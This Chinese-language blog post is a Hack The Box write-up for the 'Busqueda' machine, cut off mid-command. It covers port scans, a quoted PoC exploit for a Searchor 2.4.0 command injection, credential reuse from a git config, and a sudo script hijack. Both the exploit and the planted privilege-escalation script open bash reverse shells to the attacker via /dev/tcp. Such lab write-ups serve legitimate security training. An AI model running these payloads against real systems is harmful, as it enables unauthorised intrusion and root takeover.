<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="google-site-verification" content="JleqOUPaJdGpfRPLH4e3NfODV87Fmag6pJBPvxKQKEc"><title>[HTB]  Busqueda | Terminal-001 | T3yT3y</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="/js/gitalk.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[HTB]  Busqueda</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-07-19T07:31:42.817Z" id="date"> 2023-07-19</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-07-19T08:57:29.393Z" id="updated"> 2023-07-19</time></div></span><br><span>Word Count: <div class="control">3k</div></span><br><span>Read Time: <div class="control">16 min</div></span></div></div><hr><div id="post-content"><p class='item-img' data-src='/pic/3.jpg'><img src="/pic/3.jpg" alt="3"></p>
<span id="more"></span>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>下次还填非常简单！</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo nmap -p- --min-rate=10000 10.10.11.208<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-18 22:34 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.208<br>Host is up (0.075s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 10.09 seconds<br><br>$ sudo nmap -sT -sV -sC -O -p22,80 10.10.11.208<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-18 22:35 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.208<br>Host is up (0.074s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)<br>|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.52<br>|_http-server-header: Apache/2.4.52 (Ubuntu)<br>|_http-title: Did not follow redirect to http://searcher.htb/<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Aggressive OS guesses: Linux 5.0 (96%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Network Distance: 2 hops<br>Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 13.08 seconds<br><br>$ sudo nmap --script=vuln 10.10.11.208<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-18 22:45 EDT<br>Pre-scan script results:<br>| broadcast-avahi-dos:<br>|   Discovered hosts:<br>|     224.0.0.251<br>|   After NULL UDP avahi packet DoS (CVE-2011-1002).<br>|_  Hosts are all up (not vulnerable).<br>Nmap scan report <span class="hljs-keyword">for</span> searcher.htb (10.10.11.208)<br>Host is up (0.075s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">| http-csrf:</span><br><span class="hljs-string">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=searcher.htb</span><br><span class="hljs-string">|   Found the following possible CSRF vulnerabilities:</span><br><span class="hljs-string">|</span><br><span class="hljs-string">|     Path: http://searcher.htb:80/</span><br><span class="hljs-string">|     Form id: engine-select</span><br><span class="hljs-string">|_    Form action: /search</span><br><span class="hljs-string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 58.20 seconds<br></code></pre></td></tr></table></figure>

<p>开了22和80，并且IP会重定向到<a target="_blank" rel="noopener" href="http://searcher.htb/">http://searcher.htb</a> ，那我们就把它加进host。</p>
<h3 id="whatweb"><a href="#whatweb" class="headerlink" title="whatweb"></a>whatweb</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo whatweb http://searcher.htb/<br>http://searcher.htb/ [200 OK] Bootstrap[4.1.3], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.1.2 Python/3.10.6], IP[10.10.11.208], JQuery[3.2.1], Python[3.10.6], Script, Title[Searcher], Werkzeug[2.1.2]<br></code></pre></td></tr></table></figure>

<p>我们可以发现其使用了Werkzeug[2.1.2]。Werkzeug是一个WSGI工具包，可以作为一个Web框架的底层库。我们searchspolit一下发现其存在Werkzeug - ‘Debug Shell’ Command Execution，可惜执行一下exp会发现debug模式并没有开利用不上。</p>
<h3 id="nikto"><a href="#nikto" class="headerlink" title="nikto"></a>nikto</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo nikto -h http://searcher.htb/<br>- Nikto v2.5.0<br>---------------------------------------------------------------------------<br>+ Target IP:          10.10.11.208<br>+ Target Hostname:    searcher.htb<br>+ Target Port:        80<br>+ Start Time:         2023-07-18 22:41:05 (GMT-4)<br>---------------------------------------------------------------------------<br>+ Server: Werkzeug/2.1.2 Python/3.10.6<br>+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options<br>+ /: The X-Content-Type-Options header is not <span class="hljs-built_in">set</span>. This could allow the user agent to render the content of the site <span class="hljs-keyword">in</span> a different fashion to the MIME <span class="hljs-built_in">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/<br>+ : Server banner changed from <span class="hljs-string">&#x27;Werkzeug/2.1.2 Python/3.10.6&#x27;</span> to <span class="hljs-string">&#x27;Apache/2.4.52 (Ubuntu)&#x27;</span>.<br>+ No CGI Directories found (use <span class="hljs-string">&#x27;-C all&#x27;</span> to force check all possible <span class="hljs-built_in">dirs</span>)<br>+ OPTIONS: Allowed HTTP Methods: GET, HEAD, OPTIONS .<br>+ 7962 requests: 0 error(s) and 4 item(s) reported on remote host<br>+ End Time:           2023-07-18 22:52:12 (GMT-4) (667 seconds)<br>---------------------------------------------------------------------------<br>+ 1 host(s) tested<br></code></pre></td></tr></table></figure>

<p>没啥信息。</p>
<h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><h3 id="服务识别"><a href="#服务识别" class="headerlink" title="服务识别"></a>服务识别</h3><p class='item-img' data-src='/pic/assets/71bc8aeab65fc3deae9530b9517ae7e7.png'><img src="/pic/assets/71bc8aeab65fc3deae9530b9517ae7e7.png" alt="71bc8aeab65fc3deae9530b9517ae7e7"></p>
<p>访问一下网站，看网站介绍说是用于选择社交媒体搜索引擎提高搜索效率啥的。但是管他呢，我们最想看的是网页最下面的那一行：<code>Searchor 2.4.0</code>。直接上谷歌搜索有无漏洞可以利用。</p>
<h3 id="Searchor"><a href="#Searchor" class="headerlink" title="Searchor"></a>Searchor</h3><p>我们一搜就发现github上有相关<a target="_blank" rel="noopener" href="https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection">PoC</a>。Searchor 2.4.0存在任意命令注入的漏洞。那我们就按PoC介绍利用一下。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">PoC</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash -</span><br><br>default_port=&quot;9001&quot;<br>port=&quot;$&#123;3:-$default_port&#125;&quot;<br>rev_shell_b64=$(echo -ne &quot;bash  -c &#x27;bash -i &gt;&amp; /dev/tcp/$2/$&#123;port&#125; 0&gt;&amp;1&#x27;&quot; | base64)<br>evil_cmd=&quot;&#x27;,__import__(&#x27;os&#x27;).system(&#x27;echo $&#123;rev_shell_b64&#125;|base64 -d|bash -i&#x27;)) # junky comment&quot;<br>plus=&quot;+&quot;<br><br>echo &quot;---[Reverse Shell Exploit for Searchor &lt;= 2.4.2 (2.4.0)]---&quot;<br><br>if [ -z &quot;$&#123;evil_cmd##*$plus*&#125;&quot; ]<br>then<br>    evil_cmd=$(echo $&#123;evil_cmd&#125; | sed -r &#x27;s/[+]+/%2B/g&#x27;)<br>fi<br><br>if [ $# -ne 0 ]<br>then<br>    echo &quot;[*] Input target is $1&quot;<br>    echo &quot;[*] Input attacker is $2:$&#123;port&#125;&quot;<br>    echo &quot;[*] Run the Reverse Shell... Press Ctrl+C after successful connection&quot;<br>    curl -s -X POST $1/search -d &quot;engine=Google&amp;query=$&#123;evil_cmd&#125;&quot; 1&gt; /dev/null<br>else <br>    echo &quot;[!] Please specify a IP address of target and IP address/Port of attacker for Reverse Shell, for example: <br><br>./exploit.sh &lt;TARGET&gt; &lt;ATTACKER&gt; &lt;PORT&gt; [9001 by default]&quot;<br>fi<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ./searchor.sh http://searcher.htb/ &lt;HTB_VPN_IP&gt; &lt;LOCAL_PORT&gt;<br>---[Reverse Shell Exploit <span class="hljs-keyword">for</span> Searchor &lt;= 2.4.2 (2.4.0)]---<br>[*] Input target is http://searcher.htb/<br>[*] Input attacker is &lt;HTB_VPN_IP&gt;:&lt;LOCAL_PORT&gt;<br>[*] Run the Reverse Shell... Press Ctrl+C after successful connection<br></code></pre></td></tr></table></figure>

<p>本地nc监听一下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo nc -lnvp 443<br>listening on [any] 443 ...<br>connect to [&lt;HTB_VPN_IP&gt;] from (UNKNOWN) [10.10.11.208] 35470<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1659): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>svc@busqueda:/var/www/app$<br></code></pre></td></tr></table></figure>

<p>成功拿到立足点。在svc的home目录下可以发现user flag。</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>虽然拿到shell第一时间是去home目录下看了下flag，但是我们刚进来的<code>/var/www/app</code>目录还没有好好看一眼。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">svc@busqueda:/var/www/app$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 20<br>drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 .<br>drwxr-xr-x 4 root     root     4096 Apr  4 16:02 ..<br>-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py<br>drwxr-xr-x 8 www-data www-data 4096 Jul 19 03:03 .git<br>drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates<br></code></pre></td></tr></table></figure>

<p>我们发现有<code>.git</code>文件夹，那我们得进去看看。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">svc@busqueda:/var/www/app/.git$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 52<br>drwxr-xr-x 8 www-data www-data 4096 Jul 19 03:03 .<br>drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 ..<br>drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 branches<br>-rw-r--r-- 1 www-data www-data   15 Dec  1  2022 COMMIT_EDITMSG<br>-rw-r--r-- 1 www-data www-data  294 Dec  1  2022 config<br>-rw-r--r-- 1 www-data www-data   73 Dec  1  2022 description<br>-rw-r--r-- 1 www-data www-data   21 Dec  1  2022 HEAD<br>drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 hooks<br>-rw-r--r-- 1 root     root      259 Apr  3 15:09 index<br>drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 info<br>drwxr-xr-x 3 www-data www-data 4096 Dec  1  2022 logs<br>drwxr-xr-x 9 www-data www-data 4096 Dec  1  2022 objects<br>drwxr-xr-x 5 www-data www-data 4096 Dec  1  2022 refs<br></code></pre></td></tr></table></figure>

<p>这么多文件最需要看啥呢，当然是配置文件了，配置文件往往是最重要的那部分文件。</p>
<p>直接进行一个查看。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">svc@busqueda:/var/www/app/.git$ <span class="hljs-built_in">cat</span> config<br><span class="hljs-built_in">cat</span> config<br>[core]<br>        repositoryformatversion = 0<br>        filemode = <span class="hljs-literal">true</span><br>        bare = <span class="hljs-literal">false</span><br>        logallrefupdates = <span class="hljs-literal">true</span><br>[remote <span class="hljs-string">&quot;origin&quot;</span>]<br>        url = http://cody:******************@gitea.searcher.htb/cody/Searcher_site.git<br>        fetch = +refs/heads/*:refs/remotes/origin/*<br>[branch <span class="hljs-string">&quot;main&quot;</span>]<br>        remote = origin<br>        merge = refs/heads/main<br></code></pre></td></tr></table></figure>

<p>我们可以看到名为cody用户的github登录凭证。（不得不说他这密码看起还真像一串哈希值，我还想了一会会是什么哈希，结果之后试了一下是明文。。。。。。）</p>
<p>我们当然希望登录凭证复用问题的出现，直接用这个登录凭证登录一下看看。发现登录并不成功，我们如果看看&#x2F;etc&#x2F;passwd的话也能发现其实并没有cody这个用户，那有没有可能是svc的密码呢？我们尝试一下发现果然是。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ssh svc@10.10.11.208<br>svc@10.10.11.208<span class="hljs-string">&#x27;s password:</span><br><span class="hljs-string">Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-69-generic x86_64)</span><br><span class="hljs-string"></span><br><span class="hljs-string"> * Documentation:  https://help.ubuntu.com</span><br><span class="hljs-string"> * Management:     https://landscape.canonical.com</span><br><span class="hljs-string"> * Support:        https://ubuntu.com/advantage</span><br><span class="hljs-string"></span><br><span class="hljs-string">  System information as of Wed Jul 19 04:06:19 AM UTC 2023</span><br><span class="hljs-string"></span><br><span class="hljs-string">  System load:                      0.0185546875</span><br><span class="hljs-string">  Usage of /:                       80.9% of 8.26GB</span><br><span class="hljs-string">  Memory usage:                     59%</span><br><span class="hljs-string">  Swap usage:                       3%</span><br><span class="hljs-string">  Processes:                        238</span><br><span class="hljs-string">  Users logged in:                  0</span><br><span class="hljs-string">  IPv4 address for br-c954bf22b8b2: 172.20.0.1</span><br><span class="hljs-string">  IPv4 address for br-cbf2c5ce8e95: 172.19.0.1</span><br><span class="hljs-string">  IPv4 address for br-fba5a3e31476: 172.18.0.1</span><br><span class="hljs-string">  IPv4 address for docker0:         172.17.0.1</span><br><span class="hljs-string">  IPv4 address for eth0:            10.10.11.208</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"> * Introducing Expanded Security Maintenance for Applications.</span><br><span class="hljs-string">   Receive updates to over 25,000 software packages with your</span><br><span class="hljs-string">   Ubuntu Pro subscription. Free for personal use.</span><br><span class="hljs-string"></span><br><span class="hljs-string">     https://ubuntu.com/pro</span><br><span class="hljs-string"></span><br><span class="hljs-string">Expanded Security Maintenance for Applications is not enabled.</span><br><span class="hljs-string"></span><br><span class="hljs-string">0 updates can be applied immediately.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Enable ESM Apps to receive additional future security updates.</span><br><span class="hljs-string">See https://ubuntu.com/esm or run: sudo pro status</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">The list of available updates is more than a week old.</span><br><span class="hljs-string">To check for new updates run: sudo apt update</span><br><span class="hljs-string">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Last login: Wed Jul 19 03:04:01 2023 from 10.10.14.24</span><br><span class="hljs-string">svc@busqueda:~$ </span><br></code></pre></td></tr></table></figure>

<p>那你可能想问这不是如蜜传如蜜吗，咋又回到svc这里了，提升了啥呢。当然不是原地tp，我们现在知道了svc 的密码，那就可以试试<code>sudo -l</code>了。如果没权限那确实原地tp了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">svc@busqueda:~$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> svc:<br>Matching Defaults entries <span class="hljs-keyword">for</span> svc on busqueda:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty<br><br>User svc may run the following commands on busqueda:<br>    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *<br></code></pre></td></tr></table></figure>

<p>我们发现svc可以执行<code>/usr/bin/python3 /opt/scripts/system-checkup.py *</code>这么一条命令，我们先执行一下看看这是谁的部将。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *<br>Usage: /opt/scripts/system-checkup.py &lt;action&gt; (arg1) (arg2)<br><br>     docker-ps     : List running docker containers<br>     docker-inspect : Inpect a certain docker container<br>     full-checkup  : Run a full system checkup<br><br>svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps<br>CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS             PORTS                                             NAMES<br>960873171e2e   gitea/gitea:latest   <span class="hljs-string">&quot;/usr/bin/entrypoint…&quot;</span>   6 months ago   Up About an hour   127.0.0.1:3000-&gt;3000/tcp, 127.0.0.1:222-&gt;22/tcp   gitea<br>f84a6b33fb5a   mysql:8              <span class="hljs-string">&quot;docker-entrypoint.s…&quot;</span>   6 months ago   Up About an hour   127.0.0.1:3306-&gt;3306/tcp, 33060/tcp               mysql_db<br><br>svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup<br>Something went wrong<br></code></pre></td></tr></table></figure>

<p>我们大致试了一下action，暂时没啥好想法，先去它的路径下看一眼吧。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">svc@busqueda:/opt/scripts$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 28<br>drwxr-xr-x 3 root root 4096 Dec 24  2022 .<br>drwxr-xr-x 4 root root 4096 Mar  1 10:46 ..<br>-rwx--x--x 1 root root  586 Dec 24  2022 check-ports.py<br>-rwx--x--x 1 root root  857 Dec 24  2022 full-checkup.sh<br>drwxr-x--- 8 root root 4096 Apr  3 15:04 .git<br>-rwx--x--x 1 root root 3346 Dec 24  2022 install-flask.sh<br>-rwx--x--x 1 root root 1903 Dec 24  2022 system-checkup.py<br></code></pre></td></tr></table></figure>

<p>在同一目录下我们还看到了<code>full-checkup.sh</code>,这和那个action的名字不是一样的吗，难道说<code>system-checkup.py</code>就是调用了它来实现action吗？那如果是的话我们不禁要问了，你这调用写的是相对路径还是绝对路径呢？我们当然希望其不是绝对路径，因为这样我们就能直接通过在PATH前面的位置插入我们伪造的<code>full-checkup.sh</code>提权脚本，或者是在某个目录下创建提权脚本并在该目录执行<code>system-checkup.py</code>。</p>
<p>那么到底是不是呢？谁懂，试试就知道了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">svc@busqueda:~$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>/home/svc/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin<br></code></pre></td></tr></table></figure>

<p>那我们直接在<code>/home/svc/.local/bin</code>下操作，不管你那种情况都能利用。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">svc@busqueda:~/.local/bin$ vim full-checkup.sh<br>svc@busqueda:~/.local/bin$ <span class="hljs-built_in">chmod</span> +x full-checkup.sh<br>svc@busqueda:~/.local/bin$ ll<br>total 24<br>drwxrwxr-x 2 svc svc 4096 Jul 19 04:14 ./<br>drwxrwxr-x 5 svc svc 4096 Jun 15  2022 ../<br>-rwxrwxr-x 1 svc svc  208 Jun 15  2022 flask*<br>-rwxrwxr-x 1 svc svc   60 Jul 19 04:14 full-checkup.sh*<br>-rwxrwxr-x 1 svc svc  211 Jun 15  2022 pyjwt*<br>svc@busqueda:~/.local/bin$ <span class="hljs-built_in">cat</span> full-checkup.sh<br><span class="hljs-comment">#!/bin/bash</span><br><br>/bin/bash -i &gt;&amp; /dev/tcp/&lt;HTB_VPN_IP&gt;/8080 0&gt;&amp;1<br>svc@busqueda:~/.local/bin$ sudo /usr/bin/python3 